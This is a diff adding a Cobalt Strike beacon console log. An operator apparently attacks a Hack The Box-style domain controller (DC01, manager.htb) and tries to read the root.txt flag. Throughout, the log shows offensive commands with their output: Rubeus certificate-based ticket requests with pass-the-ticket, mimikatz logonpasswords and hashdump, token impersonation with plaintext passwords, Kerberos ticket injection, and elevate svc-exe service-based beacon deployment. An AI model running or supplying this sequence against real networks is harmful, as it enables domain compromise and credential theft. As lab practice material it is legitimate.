@@ -1,0 +1,431 @@
+10/23 11:58:56 UTC [metadata] 10.10.11.236 <- 10.10.11.236; computer: DC01; user: Raven; process: beacon.exe; pid: 1420; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+10/23 11:59:03 UTC [input] <d0pt3x> sleep 5
+10/23 11:59:03 UTC [task] <T1029> Tasked beacon to sleep for 5s
+10/23 11:59:54 UTC [checkin] host called home, sent: 16 bytes
+10/23 12:00:04 UTC [input] <d0pt3x> pwd
+10/23 12:00:04 UTC [task] <> Tasked beacon to print working directory
+10/23 12:00:04 UTC [checkin] host called home, sent: 8 bytes
+10/23 12:00:05 UTC [output]
+Current directory is C:\Users\Raven\Documents
+
+10/23 12:00:48 UTC [input] <d0pt3x> Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /ptt
+10/23 12:00:48 UTC [error] Unknown command: Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /ptt
+10/23 12:00:57 UTC [input] <d0pt3x> .\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /ptt
+10/23 12:00:57 UTC [error] Unknown command: .\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /ptt
+10/23 12:01:02 UTC [input] <d0pt3x> ls
+10/23 12:01:02 UTC [task] <> Tasked beacon to list files in .
+10/23 12:01:03 UTC [checkin] host called home, sent: 19 bytes
+10/23 12:01:03 UTC [output]
+C:\Users\Raven\Documents\*
+D	0	10/23/2023 11:58:49	.
+D	0	10/23/2023 11:58:49	..
+F	2879	10/23/2023 11:50:27	administrator.pfx
+F	315392	10/23/2023 11:58:49	beacon.exe
+D	0	10/23/2023 11:37:30	evil-winrm
+D	0	07/27/2023 08:23:57	My Music
+D	0	07/27/2023 08:23:57	My Pictures
+D	0	07/27/2023 08:23:57	My Videos
+F	446976	10/23/2023 11:49:21	Rubeus.exe
+F	1634	10/23/2023 11:51:26	ticket.kirbi
+
+
+10/23 12:01:19 UTC [input] <d0pt3x> .\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /ptt
+10/23 12:01:19 UTC [error] Unknown command: .\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /ptt
+10/23 12:01:49 UTC [input] <d0pt3x> logonpasswords
+10/23 12:01:49 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+10/23 12:01:52 UTC [checkin] host called home, sent: 312954 bytes
+10/23 12:01:58 UTC [output]
+received output:
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+
+10/23 12:02:19 UTC [input] <d0pt3x> execute Rubeus.exe
+10/23 12:02:19 UTC [task] <T1106> Tasked beacon to execute: Rubeus.exe
+10/23 12:02:20 UTC [checkin] host called home, sent: 18 bytes
+10/23 12:02:30 UTC [input] <d0pt3x> pwd
+10/23 12:02:30 UTC [task] <> Tasked beacon to print working directory
+10/23 12:02:30 UTC [checkin] host called home, sent: 8 bytes
+10/23 12:02:31 UTC [output]
+Current directory is C:\Users\Raven\Documents
+
+10/23 12:02:44 UTC [input] <d0pt3x> execute Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /ptt
+10/23 12:02:44 UTC [task] <T1106> Tasked beacon to execute: Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /ptt
+10/23 12:02:46 UTC [checkin] host called home, sent: 81 bytes
+10/23 12:17:17 UTC [input] <d0pt3x> make_token MANAGER\administrator Passw0rd
+10/23 12:17:17 UTC [task] <T1134> Tasked beacon to create a token for MANAGER\administrator
+10/23 12:17:17 UTC [checkin] host called home, sent: 48 bytes
+10/23 12:17:18 UTC [output]
+Impersonated MANAGER\administrator (netonly)
+
+10/23 12:17:39 UTC [input] <d0pt3x> kerberos_ticket_use /home/cash/manager/admin.kirbi
+10/23 12:17:39 UTC [task] <T1097> Tasked beacon to apply ticket in /home/cash/manager/admin.kirbi
+10/23 12:17:39 UTC [checkin] host called home, sent: 4243 bytes
+10/23 12:17:39 UTC [error] kerberos ticket use failed: 0 - ERROR_SUCCESS
+10/23 12:21:08 UTC [input] <d0pt3x> kerberos_ticket_use /home/cash/purge.kirbi
+10/23 12:21:08 UTC [task] <T1097> Tasked beacon to apply ticket in /home/cash/purge.kirbi
+10/23 12:21:09 UTC [checkin] host called home, sent: 3696 bytes
+10/23 12:21:31 UTC [input] <d0pt3x> ls \\dc01.manager.htb\c$
+10/23 12:21:31 UTC [task] <T1077> Tasked beacon to list files in \\dc01.manager.htb\c$
+10/23 12:21:36 UTC [checkin] host called home, sent: 39 bytes
+10/23 12:21:36 UTC [output]
+\\dc01.manager.htb\c$\*
+D	0	07/27/2023 08:23:10	$Recycle.Bin
+D	0	07/20/2021 12:20:24	Documents and Settings
+D	0	07/27/2023 03:04:11	inetpub
+F	738197504	10/23/2023 07:46:08	pagefile.sys
+D	0	07/27/2023 03:58:06	PerfLogs
+D	0	09/28/2023 13:28:10	Program Files
+D	0	07/27/2023 04:18:31	Program Files (x86)
+D	0	09/29/2023 12:55:08	ProgramData
+D	0	07/20/2021 12:20:29	Recovery
+D	0	07/27/2023 04:18:21	SQL2019
+D	0	07/27/2023 03:04:14	System Volume Information
+D	0	07/27/2023 08:23:57	Users
+D	0	10/23/2023 12:14:18	Windows
+
+
+10/23 12:21:57 UTC [input] <d0pt3x> hashdump
+10/23 12:21:57 UTC [error] this command requires administrator privileges
+10/23 12:22:04 UTC [input] <d0pt3x> logonpasswords
+10/23 12:22:04 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+10/23 12:22:07 UTC [checkin] host called home, sent: 312954 bytes
+10/23 12:22:11 UTC [output]
+received output:
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+
+10/23 12:23:03 UTC [input] <d0pt3x> type C:\Users\Administrator\root.txt
+10/23 12:23:03 UTC [error] Unknown command: type C:\Users\Administrator\root.txt
+10/23 12:23:13 UTC [input] <d0pt3x> cat C:\Users\Administrator\root.txt
+10/23 12:23:13 UTC [error] Unknown command: cat C:\Users\Administrator\root.txt
+10/23 12:23:24 UTC [input] <d0pt3x> ls C:\Users\Administrator\root.txt
+10/23 12:23:24 UTC [task] <> Tasked beacon to list files in C:\Users\Administrator\root.txt
+10/23 12:23:24 UTC [checkin] host called home, sent: 49 bytes
+10/23 12:23:24 UTC [error] could not open C:\Users\Administrator\root.txt\*: 3 - ERROR_PATH_NOT_FOUND
+10/23 12:23:31 UTC [input] <d0pt3x> ls C:\Users\Administrator\
+10/23 12:23:31 UTC [task] <> Tasked beacon to list files in C:\Users\Administrator\
+10/23 12:23:35 UTC [checkin] host called home, sent: 40 bytes
+10/23 12:23:35 UTC [error] could not open C:\Users\Administrator\*: 5 - ERROR_ACCESS_DENIED
+10/23 12:23:46 UTC [input] <d0pt3x> ls \\dc01.manager.htb\c$\Users
+10/23 12:23:46 UTC [task] <> Tasked beacon to list files in \\dc01.manager.htb\c$\Users
+10/23 12:23:51 UTC [checkin] host called home, sent: 45 bytes
+10/23 12:23:51 UTC [output]
+\\dc01.manager.htb\c$\Users\*
+D	0	07/27/2023 08:23:57	.
+D	0	07/27/2023 08:23:57	..
+D	0	07/29/2023 14:34:38	Administrator
+D	0	09/15/2018 00:28:48	All Users
+D	0	07/20/2021 12:20:24	Default
+D	0	09/15/2018 00:28:48	Default User
+F	174	09/15/2018 00:16:48	desktop.ini
+D	0	07/20/2021 12:23:25	Public
+D	0	07/27/2023 08:23:57	Raven
+
+
+10/23 12:23:59 UTC [input] <d0pt3x> ls \\dc01.manager.htb\c$\Users\Administrator
+10/23 12:23:59 UTC [task] <> Tasked beacon to list files in \\dc01.manager.htb\c$\Users\Administrator
+10/23 12:24:01 UTC [checkin] host called home, sent: 59 bytes
+10/23 12:24:04 UTC [output]
+\\dc01.manager.htb\c$\Users\Administrator\*
+D	0	07/29/2023 14:34:38	.
+D	0	07/29/2023 14:34:38	..
+D	0	09/28/2023 14:27:04	3D Objects
+D	0	09/28/2023 13:34:22	AppData
+D	0	07/20/2021 12:23:22	Application Data
+D	0	09/28/2023 14:27:04	Contacts
+D	0	07/20/2021 12:23:22	Cookies
+D	0	09/28/2023 14:27:04	Desktop
+D	0	09/28/2023 14:27:05	Documents
+D	0	09/28/2023 14:27:05	Downloads
+D	0	09/28/2023 14:27:04	Favorites
+D	0	09/28/2023 14:27:05	Links
+D	0	07/20/2021 12:23:22	Local Settings
+D	0	09/28/2023 14:27:05	Music
+D	0	07/20/2021 12:23:22	My Documents
+D	0	07/20/2021 12:23:22	NetHood
+F	1048576	10/23/2023 12:23:29	NTUSER.DAT
+F	269312	07/20/2021 12:23:22	ntuser.dat.LOG1
+F	28672	07/20/2021 12:23:22	ntuser.dat.LOG2
+F	65536	08/25/2021 04:09:23	NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
+F	524288	07/20/2021 12:23:22	NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
+F	524288	07/20/2021 12:23:22	NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
+F	20	07/20/2021 12:23:22	ntuser.ini
+D	0	09/28/2023 14:27:04	Pictures
+D	0	07/20/2021 12:23:22	PrintHood
+D	0	07/20/2021 12:23:22	Recent
+D	0	09/28/2023 14:27:05	Saved Games
+D	0	09/28/2023 14:27:05	Searches
+D	0	07/20/2021 12:23:22	SendTo
+D	0	07/20/2021 12:23:22	Start Menu
+D	0	07/20/2021 12:23:22	Templates
+D	0	09/28/2023 14:27:04	Videos
+
+
+10/23 12:24:09 UTC [input] <d0pt3x> ls \\dc01.manager.htb\c$\Users\Administrator\Desktop
+10/23 12:24:09 UTC [task] <> Tasked beacon to list files in \\dc01.manager.htb\c$\Users\Administrator\Desktop
+10/23 12:24:15 UTC [checkin] host called home, sent: 67 bytes
+10/23 12:24:16 UTC [output]
+\\dc01.manager.htb\c$\Users\Administrator\Desktop\*
+D	0	09/28/2023 14:27:04	.
+D	0	09/28/2023 14:27:04	..
+F	282	09/28/2023 14:27:04	desktop.ini
+F	34	10/23/2023 07:47:11	root.txt
+
+
+10/23 12:24:33 UTC [input] <d0pt3x> powershell cat \\dc01.manager.htb\c$\Users\Administrator\Desktop\root.txt
+10/23 12:24:33 UTC [task] <T1086> Tasked beacon to run: cat \\dc01.manager.htb\c$\Users\Administrator\Desktop\root.txt
+10/23 12:24:37 UTC [checkin] host called home, sent: 231 bytes
+10/23 12:24:40 UTC [output]
+received output:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">cat : Access is denied_x000D__x000A_</S><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ cat \\dc01.manager.htb\c$\Users\Administrator\Desktop\root.txt_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (\\dc01.manager....esktop\root.txt:String) [Get-Content], Unauthorized _x000D__x000A_</S><S S="Error">   AccessException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">cat : Cannot find path '\\dc01.manager.htb\c$\Users\Administrator\Desktop\root.txt' because it does not exist._x000D__x000A_</S><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ cat \\dc01.manager.htb\c$\Users\Administrator\Desktop\root.txt_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (\\dc01.manager....esktop\root.txt:String) [Get-Content], ItemNotFoundEx _x000D__x000A_</S><S S="Error">   ception_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
+
+10/23 12:24:58 UTC [input] <d0pt3x> ls \\dc01.manager.htb\c$\Users\Administrator\Desktop\root.txt
+10/23 12:24:58 UTC [task] <> Tasked beacon to list files in \\dc01.manager.htb\c$\Users\Administrator\Desktop\root.txt
+10/23 12:25:00 UTC [checkin] host called home, sent: 76 bytes
+10/23 12:25:00 UTC [error] could not open \\dc01.manager.htb\c$\Users\Administrator\Desktop\root.txt\*: 267 - ERROR_DIRECTORY, STATUS_NOTIFY_CLEANUP
+10/23 12:25:34 UTC [input] <d0pt3x> shell type \\dc01.manager.htb\c$\Users\Administrator\Desktop\root.txt
+10/23 12:25:34 UTC [task] <T1059> Tasked beacon to run: type \\dc01.manager.htb\c$\Users\Administrator\Desktop\root.txt
+10/23 12:25:37 UTC [checkin] host called home, sent: 94 bytes
+10/23 12:25:37 UTC [output]
+received output:
+Access is denied.
+
+
+10/23 12:28:30 UTC [input] <d0pt3x> kerberos_ticket_use /home/cash/purge.kirbi
+10/23 12:28:30 UTC [task] <T1097> Tasked beacon to apply ticket in /home/cash/purge.kirbi
+10/23 12:28:33 UTC [checkin] host called home, sent: 3696 bytes
+10/23 12:30:11 UTC [input] <d0pt3x> upload soor \\dc01.manager.htb\C$\Users\
+10/23 12:30:11 UTC [error] upload error: '/opt/CobaltStrike/Client/soor \\dc01.manager.htb\C$\Users\' does not exist
+10/23 12:30:40 UTC [input] <d0pt3x> ls \\dc01.manager.htb\c$
+10/23 12:30:40 UTC [task] <T1077> Tasked beacon to list files in \\dc01.manager.htb\c$
+10/23 12:30:42 UTC [checkin] host called home, sent: 39 bytes
+10/23 12:30:43 UTC [output]
+\\dc01.manager.htb\c$\*
+D	0	07/27/2023 08:23:10	$Recycle.Bin
+D	0	07/20/2021 12:20:24	Documents and Settings
+D	0	07/27/2023 03:04:11	inetpub
+F	738197504	10/23/2023 07:46:08	pagefile.sys
+D	0	07/27/2023 03:58:06	PerfLogs
+D	0	09/28/2023 13:28:10	Program Files
+D	0	07/27/2023 04:18:31	Program Files (x86)
+D	0	09/29/2023 12:55:08	ProgramData
+D	0	07/20/2021 12:20:29	Recovery
+D	0	07/27/2023 04:18:21	SQL2019
+D	0	07/27/2023 03:04:14	System Volume Information
+D	0	07/27/2023 08:23:57	Users
+D	0	10/23/2023 12:14:18	Windows
+
+
+10/23 12:31:25 UTC [input] <d0pt3x> powershell ls \\dc01.manager.htb\c$
+10/23 12:31:25 UTC [task] <T1086> Tasked beacon to run: ls \\dc01.manager.htb\c$
+10/23 12:31:29 UTC [checkin] host called home, sent: 127 bytes
+10/23 12:31:32 UTC [output]
+received output:
+#< CLIXML
+
+
+    Directory: \\dc01.manager.htb\c$
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        7/27/2023   3:04 AM                inetpub                                                               
+d-----        7/27/2023   3:58 AM                PerfLogs                                                              
+d-r---        9/28/2023   1:28 PM                Program Files                                                         
+d-----        7/27/2023   4:18 AM                Program Files (x86)                                                   
+d-----        7/27/2023   4:18 AM                SQL2019                                                               
+d-r---        7/27/2023   8:23 AM                Users                                                                 
+d-----       10/23/2023  12:14 PM                Windows                                                               
+
+
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+
+10/23 12:31:45 UTC [input] <d0pt3x> powershell ls \\dc01.manager.htb\c$\Users | fl
+10/23 12:31:45 UTC [task] <T1086> Tasked beacon to run: ls \\dc01.manager.htb\c$\Users | fl
+10/23 12:31:47 UTC [checkin] host called home, sent: 159 bytes
+10/23 12:31:51 UTC [output]
+received output:
+#< CLIXML
+
+
+    Directory: \\dc01.manager.htb\c$\Users
+
+
+
+Name           : Administrator
+CreationTime   : 7/20/2021 12:23:21 PM
+LastWriteTime  : 7/29/2023 2:34:38 PM
+LastAccessTime : 10/1/2023 10:13:58 PM
+Mode           : d-----
+LinkType       : 
+Target         : 
+
+Name           : Public
+CreationTime   : 9/15/2018 12:19:00 AM
+LastWriteTime  : 7/20/2021 12:23:25 PM
+LastAccessTime : 10/1/2023 10:13:58 PM
+Mode           : d-r---
+LinkType       : 
+Target         : 
+
+Name           : Raven
+CreationTime   : 7/27/2023 8:23:57 AM
+LastWriteTime  : 7/27/2023 8:23:57 AM
+LastAccessTime : 10/1/2023 10:13:58 PM
+Mode           : d-----
+LinkType       : 
+Target         : 
+
+
+
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+
+10/23 12:32:04 UTC [input] <d0pt3x> powershell ls \\dc01.manager.htb\c$\Users\Administrator | fl
+10/23 12:32:04 UTC [task] <T1086> Tasked beacon to run: ls \\dc01.manager.htb\c$\Users\Administrator | fl
+10/23 12:32:06 UTC [checkin] host called home, sent: 195 bytes
+10/23 12:32:09 UTC [output]
+received output:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">ls : Access to the path '\\dc01.manager.htb\c$\Users\Administrator' is denied._x000D__x000A_</S><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ ls \\dc01.manager.htb\c$\Users\Administrator | fl_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (\\dc01.manager....s\Administrator:String) [Get-ChildItem], Unauthoriz _x000D__x000A_</S><S S="Error">   edAccessException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
+
+10/23 12:32:16 UTC [input] <d0pt3x> powershell ls \\dc01.manager.htb\c$\Users\Administrator
+10/23 12:32:16 UTC [task] <T1086> Tasked beacon to run: ls \\dc01.manager.htb\c$\Users\Administrator
+10/23 12:32:20 UTC [checkin] host called home, sent: 183 bytes
+10/23 12:32:20 UTC [output]
+received output:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">ls : Access to the path '\\dc01.manager.htb\c$\Users\Administrator' is denied._x000D__x000A_</S><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ ls \\dc01.manager.htb\c$\Users\Administrator_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (\\dc01.manager....s\Administrator:String) [Get-ChildItem], Unauthoriz _x000D__x000A_</S><S S="Error">   edAccessException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
+
+10/23 12:32:55 UTC [input] <d0pt3x> elevate svc-exe tcp
+10/23 12:32:55 UTC [task] <T1035, T1050> Tasked beacon to run windows/beacon_bind_tcp (127.0.0.1:4444) via Service Control Manager (\\127.0.0.1\ADMIN$\947f582.exe)
+10/23 12:32:56 UTC [indicator] service: \\. 947f582
+10/23 12:32:56 UTC [indicator] file: 09e7d19f98bb60d4d23ebef9e20b131a 316416 bytes \\127.0.0.1\ADMIN$\947f582.exe
+10/23 12:32:56 UTC [checkin] host called home, sent: 318754 bytes
+10/23 12:33:14 UTC [error] could not upload file: 5 - ERROR_ACCESS_DENIED
+10/23 12:33:14 UTC [error] Could not open service control manager on .: 5
+10/23 12:33:14 UTC [error] Could not connect to target
+10/23 12:33:43 UTC [input] <d0pt3x> ls \\dc01.manager.htb\c$
+10/23 12:33:43 UTC [task] <T1077> Tasked beacon to list files in \\dc01.manager.htb\c$
+10/23 12:33:45 UTC [checkin] host called home, sent: 39 bytes
+10/23 12:33:45 UTC [output]
+\\dc01.manager.htb\c$\*
+D	0	07/27/2023 08:23:10	$Recycle.Bin
+D	0	07/20/2021 12:20:24	Documents and Settings
+D	0	07/27/2023 03:04:11	inetpub
+F	738197504	10/23/2023 07:46:08	pagefile.sys
+D	0	07/27/2023 03:58:06	PerfLogs
+D	0	09/28/2023 13:28:10	Program Files
+D	0	07/27/2023 04:18:31	Program Files (x86)
+D	0	09/29/2023 12:55:08	ProgramData
+D	0	07/20/2021 12:20:29	Recovery
+D	0	07/27/2023 04:18:21	SQL2019
+D	0	07/27/2023 03:04:14	System Volume Information
+D	0	07/27/2023 08:23:57	Users
+D	0	10/23/2023 12:14:18	Windows
+
+
+10/23 12:33:52 UTC [input] <d0pt3x> powershell ls \\dc01.manager.htb\c$\Users\Administrator
+10/23 12:33:52 UTC [task] <T1086> Tasked beacon to run: ls \\dc01.manager.htb\c$\Users\Administrator
+10/23 12:33:55 UTC [checkin] host called home, sent: 183 bytes
+10/23 12:33:56 UTC [output]
+received output:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">ls : Access to the path '\\dc01.manager.htb\c$\Users\Administrator' is denied._x000D__x000A_</S><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ ls \\dc01.manager.htb\c$\Users\Administrator_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (\\dc01.manager....s\Administrator:String) [Get-ChildItem], Unauthoriz _x000D__x000A_</S><S S="Error">   edAccessException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
+
+10/23 12:34:13 UTC [input] <d0pt3x> elevate svc-exe tcp
+10/23 12:34:14 UTC [task] <T1035, T1050> Tasked beacon to run windows/beacon_bind_tcp (127.0.0.1:4444) via Service Control Manager (\\127.0.0.1\ADMIN$\16951fe.exe)
+10/23 12:34:14 UTC [indicator] service: \\. 16951fe
+10/23 12:34:14 UTC [indicator] file: d5848d5df9dab30e8d8033b5a880b213 316416 bytes \\127.0.0.1\ADMIN$\16951fe.exe
+10/23 12:34:17 UTC [checkin] host called home, sent: 318754 bytes
+10/23 12:34:35 UTC [error] could not upload file: 5 - ERROR_ACCESS_DENIED
+10/23 12:34:35 UTC [error] Could not open service control manager on .: 5
+10/23 12:34:35 UTC [error] Could not connect to target
+10/23 12:49:50 UTC [input] <d0pt3x> kerberos_ticket_use /home/cash/purge.kirbi
+10/23 12:49:50 UTC [task] <T1097> Tasked beacon to apply ticket in /home/cash/purge.kirbi
+10/23 12:49:55 UTC [checkin] host called home, sent: 3696 bytes
+10/23 12:50:05 UTC [input] <d0pt3x> ls \\dc01.manager.htb\c$
+10/23 12:50:05 UTC [task] <T1077> Tasked beacon to list files in \\dc01.manager.htb\c$
+10/23 12:50:10 UTC [checkin] host called home, sent: 39 bytes
+10/23 12:50:11 UTC [output]
+\\dc01.manager.htb\c$\*
+D	0	07/27/2023 08:23:10	$Recycle.Bin
+D	0	07/20/2021 12:20:24	Documents and Settings
+D	0	07/27/2023 03:04:11	inetpub
+F	738197504	10/23/2023 07:46:08	pagefile.sys
+D	0	07/27/2023 03:58:06	PerfLogs
+D	0	09/28/2023 13:28:10	Program Files
+D	0	07/27/2023 04:18:31	Program Files (x86)
+D	0	09/29/2023 12:55:08	ProgramData
+D	0	07/20/2021 12:20:29	Recovery
+D	0	07/27/2023 04:18:21	SQL2019
+D	0	07/27/2023 03:04:14	System Volume Information
+D	0	07/27/2023 08:23:57	Users
+D	0	10/23/2023 12:14:18	Windows
+
+
+10/23 12:50:34 UTC [input] <d0pt3x> upload \\dc01.manager.htb\c$\soor
+10/23 12:50:34 UTC [error] upload error: '/opt/CobaltStrike/Client/\\dc01.manager.htb\c$\soor' does not exist
+10/23 12:51:33 UTC [input] <d0pt3x> rev2self
+10/23 12:51:33 UTC [task] <T1134> Tasked beacon to revert token
+10/23 12:51:33 UTC [input] <d0pt3x> make_token dc01.manager.htb\akash rootme
+10/23 12:51:33 UTC [task] <T1134> Tasked beacon to create a token for dc01.manager.htb\akash
+10/23 12:51:34 UTC [checkin] host called home, sent: 55 bytes
+10/23 12:51:35 UTC [output]
+Impersonated dc01.manager.htb\akash (netonly)
+
+10/23 12:51:56 UTC [input] <d0pt3x> kerberos_ticket_use /home/cash/purge.kirbi
+10/23 12:51:56 UTC [task] <T1097> Tasked beacon to apply ticket in /home/cash/purge.kirbi
+10/23 12:52:01 UTC [checkin] host called home, sent: 3696 bytes
+10/23 12:52:13 UTC [input] <d0pt3x> ls \\dc01.manager.htb\c$
+10/23 12:52:13 UTC [task] <T1077> Tasked beacon to list files in \\dc01.manager.htb\c$
+10/23 12:52:16 UTC [checkin] host called home, sent: 39 bytes
+10/23 12:52:17 UTC [output]
+\\dc01.manager.htb\c$\*
+D	0	07/27/2023 08:23:10	$Recycle.Bin
+D	0	07/20/2021 12:20:24	Documents and Settings
+D	0	07/27/2023 03:04:11	inetpub
+F	738197504	10/23/2023 07:46:08	pagefile.sys
+D	0	07/27/2023 03:58:06	PerfLogs
+D	0	09/28/2023 13:28:10	Program Files
+D	0	07/27/2023 04:18:31	Program Files (x86)
+D	0	09/29/2023 12:55:08	ProgramData
+D	0	07/20/2021 12:20:29	Recovery
+D	0	07/27/2023 04:18:21	SQL2019
+D	0	07/27/2023 03:04:14	System Volume Information
+D	0	07/27/2023 08:23:57	Users
+D	0	10/23/2023 12:14:18	Windows
+
+
+10/23 12:52:29 UTC [input] <d0pt3x> powershell ls \\dc01.manager.htb\c$
+10/23 12:52:29 UTC [task] <T1086> Tasked beacon to run: ls \\dc01.manager.htb\c$
+10/23 12:52:33 UTC [checkin] host called home, sent: 127 bytes
+10/23 12:52:36 UTC [output]
+received output:
+#< CLIXML
+
+
+    Directory: \\dc01.manager.htb\c$
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        7/27/2023   3:04 AM                inetpub                                                               
+d-----        7/27/2023   3:58 AM                PerfLogs                                                              
+d-r---        9/28/2023   1:28 PM                Program Files                                                         
+d-----        7/27/2023   4:18 AM                Program Files (x86)                                                   
+d-----        7/27/2023   4:18 AM                SQL2019                                                               
+d-r---        7/27/2023   8:23 AM                Users                                                                 
+d-----       10/23/2023  12:14 PM                Windows                                                               
+
+
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+
